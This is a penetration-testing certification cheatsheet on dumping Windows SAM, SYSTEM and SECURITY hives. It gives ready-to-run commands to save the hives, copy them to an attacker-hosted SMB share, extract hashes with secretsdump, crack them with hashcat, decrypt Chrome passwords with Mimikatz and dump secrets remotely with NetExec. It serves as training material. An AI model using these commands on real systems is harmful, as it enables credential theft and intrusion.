# Attacking SAM, SYSTEM, and SECURITY — CPTS Cheatsheet

**Core idea:** With local admin, dump the SAM/SYSTEM/SECURITY hives, transfer offline, and crack. Doing this offline means no need to maintain an active session with the target.

---

## 1. Registry Hives

| Hive | Description |
|---|---|
| `HKLM\SAM` | Password hashes for local user accounts |
| `HKLM\SYSTEM` | System boot key — encrypts the SAM database, required to decrypt hashes |
| `HKLM\SECURITY` | LSA-related data: cached domain credentials (DCC2), cleartext passwords, DPAPI keys |

If only local hashes matter → SAM + SYSTEM is enough. Grab SECURITY too if the box is domain-joined (cached domain creds + LSA secrets).

---

## 2. Save Hives with `reg.exe`

From an administrative `cmd.exe`:

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

---

## 3. Exfil via Impacket `smbserver`

Attack host — stand up a share:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/Documents/
```

`-smb2support` is required — SMBv1 is disabled by default on modern Windows.

Target — move the hives to the share:

```cmd
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```

Confirm on attack host:

```bash
ls
# sam.save  security.save  system.save
```

---

## 4. Dump Hashes with `secretsdump`

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Process order: bootkey (from SYSTEM) is retrieved first → used to decrypt SAM. Without it, hashes can't be decrypted.

Output format:

```
Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

`31d6cfe0d16ae931b73c59d7e0c089c0` = NT hash of an **empty password**. Memorize this constant.

Also dumped from SECURITY:

```
Dumping cached domain logon information (domain/username:hash)
Dumping LSA Secrets
DPAPI_SYSTEM (dpapi_machinekey, dpapi_userkey)
NL$KM
```

---

## 5. Cracking with Hashcat

Copy NT hashes into a text file, one per line:

```bash
sudo vim hashestocrack.txt
```

```
64f12cddaa88057e06a81b54e73b949b
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Mode `1000` = NT/NTLM:

```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Modern Windows stores NT hashes by default. LM hashes only matter on older/legacy systems (pre-Vista / pre-2008).

> This is a well-known technique — admins may detect/prevent it. See MITRE ATT&CK for detection/mitigation coverage.

---

## 6. DCC2 Hashes (Cached Domain Credentials)

From `HKLM\SECURITY` — local, hashed copies of network credential hashes:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

Hashcat mode `2100`:

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

Key facts:

```
Uses PBKDF2 → much slower to crack than NT hashes (~800x on comparable hardware).
Cannot be used for Pass-the-Hash / lateral movement.
```

---

## 7. DPAPI

Data Protection API — encrypts/decrypts per-user data blobs used by many apps:

| Application | Use of DPAPI |
|---|---|
| Internet Explorer | Saved site autofill (user/pass) |
| Google Chrome | Saved site autofill (user/pass) |
| Outlook | Email account passwords |
| Remote Desktop Connection | Saved connection creds |
| Credential Manager | Saved creds for shares, Wi-Fi, VPN, etc. |

Tools to decrypt: Impacket `dpapi.py`, Mimikatz, DonPAPI (remote).

```cmd
mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 8. Remote Dumping with NetExec

LSA secrets remotely:

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
```

SAM remotely:

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam
```

Both give the full hash dump / LSA secrets in one shot — no manual hive save/transfer needed if you already have local-admin creds.

---

## 9. Must-Remember Commands

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

```bash
sudo python3 smbserver.py -smb2support CompData /path/to/dir/
```

```cmd
move sam.save \\<attacker_ip>\CompData
```

```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
hashcat -m 2100 '<DCC2_hash>' /usr/share/wordlists/rockyou.txt

netexec smb <ip> --local-auth -u <user> -p '<pass>' --sam
netexec smb <ip> --local-auth -u <user> -p '<pass>' --lsa
```

---

## 10. Memory Block

```
SAM / SYSTEM / SECURITY

SAM      → local password hashes
SYSTEM   → boot key (decrypts SAM)
SECURITY → DCC2, LSA secrets, DPAPI keys

reg.exe save → grab hives
smbserver.py → exfil offline
secretsdump.py → offline parse

NT hash        → hashcat -m 1000
DCC2 hash      → hashcat -m 2100 (slow, PBKDF2, no PtH)
DPAPI          → per-app secret protection (mimikatz dpapi::, dpapi.py)

netexec --sam / --lsa → one-shot remote equivalent
```

---

## 11. One-Line Mental Model

> Local admin on a Windows box gets you the SAM (local hashes), SYSTEM (the key to decrypt them), and SECURITY (cached domain creds + DPAPI keys) — pull all three, crack offline, and remember the NT hash of an empty password so you don't waste time "cracking" it.
